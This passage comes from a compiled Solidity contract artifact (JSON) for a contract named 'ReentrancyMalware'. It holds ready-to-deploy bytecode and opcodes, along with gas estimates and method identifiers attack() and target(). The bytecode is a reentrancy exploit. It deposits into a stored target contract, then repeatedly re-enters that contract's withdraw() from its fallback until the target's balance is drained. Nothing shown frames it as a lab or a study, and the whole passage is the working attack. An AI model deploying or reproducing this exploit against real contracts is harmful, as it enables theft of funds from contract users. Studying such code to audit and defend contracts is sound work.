					"object": "608060405234801561000f575f5ffd5b506040516107fc3803806107fc833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6106f08061010c5f395ff3fe60806040526004361061002c575f3560e01c80639e5faafc146101c0578063d4b83992146101ca57610033565b3661003357005b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156101be575f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f3ccfd60b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161013a9190610504565b5f604051808303815f865af19150503d805f8114610173576040519150601f19603f3d011682016040523d82523d5f602084013e610178565b606091505b50509050806101bc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101b390610574565b60405180910390fd5b505b005b6101c86101f4565b005b3480156101d5575f5ffd5b506101de61048e565b6040516101eb91906105d1565b60405180910390f35b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16346040516024016040516020818303038152906040527fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516102bd9190610504565b5f6040518083038185875af1925050503d805f81146102f7576040519150601f19603f3d011682016040523d82523d5f602084013e6102fc565b606091505b5050905080610340576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161033790610634565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f3ccfd60b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516104079190610504565b5f604051808303815f865af19150503d805f8114610440576040519150601f19603f3d011682016040523d82523d5f602084013e610445565b606091505b5050809150508061048b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104829061069c565b60405180910390fd5b50565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f6104de826104b2565b6104e881856104bc565b93506104f88185602086016104c6565b80840191505092915050565b5f61050f82846104d4565b915081905092915050565b5f82825260208201905092915050565b7f41747461636b206661696c6564000000000000000000000000000000000000005f82015250565b5f61055e600d8361051a565b91506105698261052a565b602082019050919050565b5f6020820190508181035f83015261058b81610552565b9050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6105bb82610592565b9050919050565b6105cb816105b1565b82525050565b5f6020820190506105e45f8301846105c2565b92915050565b7f4465706f736974206661696c65640000000000000000000000000000000000005f82015250565b5f61061e600e8361051a565b9150610629826105ea565b602082019050919050565b5f6020820190508181035f83015261064b81610612565b9050919050565b7f496e697469616c207769746864726177206661696c65640000000000000000005f82015250565b5f61068660178361051a565b915061069182610652565b602082019050919050565b5f6020820190508181035f8301526106b38161067a565b905091905056fea264697066735822122012f88405885251229528625f977e9554d0b81b73ecbb70e0946ca271f152ea2964736f6c634300081d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x7FC CODESIZE SUB DUP1 PUSH2 0x7FC DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x6F0 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1C0 JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x1CA JUMPI PUSH2 0x33 JUMP JUMPDEST CALLDATASIZE PUSH2 0x33 JUMPI STOP JUMPDEST PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0x1BE JUMPI PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3CCFD60B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x13A SWAP2 SWAP1 PUSH2 0x504 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x173 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x178 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x1BC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1B3 SWAP1 PUSH2 0x574 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMPDEST STOP JUMPDEST PUSH2 0x1C8 PUSH2 0x1F4 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D5 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x1DE PUSH2 0x48E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1EB SWAP2 SWAP1 PUSH2 0x5D1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xD0E30DB000000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x2BD SWAP2 SWAP1 PUSH2 0x504 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x2F7 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2FC JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x340 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x337 SWAP1 PUSH2 0x634 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3CCFD60B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x407 SWAP2 SWAP1 PUSH2 0x504 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x440 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x445 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP DUP1 SWAP2 POP POP DUP1 PUSH2 0x48B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x482 SWAP1 PUSH2 0x69C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x4DE DUP3 PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x4E8 DUP2 DUP6 PUSH2 0x4BC JUMP JUMPDEST SWAP4 POP PUSH2 0x4F8 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x4C6 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x50F DUP3 DUP5 PUSH2 0x4D4 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x41747461636B206661696C656400000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x55E PUSH1 0xD DUP4 PUSH2 0x51A JUMP JUMPDEST SWAP2 POP PUSH2 0x569 DUP3 PUSH2 0x52A JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x58B DUP2 PUSH2 0x552 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5BB DUP3 PUSH2 0x592 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5CB DUP2 PUSH2 0x5B1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5E4 PUSH0 DUP4 ADD DUP5 PUSH2 0x5C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4465706F736974206661696C6564000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x61E PUSH1 0xE DUP4 PUSH2 0x51A JUMP JUMPDEST SWAP2 POP PUSH2 0x629 DUP3 PUSH2 0x5EA JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x64B DUP2 PUSH2 0x612 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x496E697469616C207769746864726177206661696C6564000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x686 PUSH1 0x17 DUP4 PUSH2 0x51A JUMP JUMPDEST SWAP2 POP PUSH2 0x691 DUP3 PUSH2 0x652 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x6B3 DUP2 PUSH2 0x67A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SLT EXTCALL DUP5 SDIV DUP9 MSTORE MLOAD 0x22 SWAP6 0x28 PUSH3 0x5F977E SWAP6 SLOAD 0xD0 0xB8 SHL PUSH20 0xECBB70E0946CA271F152EA2964736F6C63430008 SAR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "355200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"attack()": "infinite",
						"target()": "2507"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"target()": "d4b83992"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 2,
						"contract": "M/Reentrancy Malware.sol:ReentrancyMalware",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}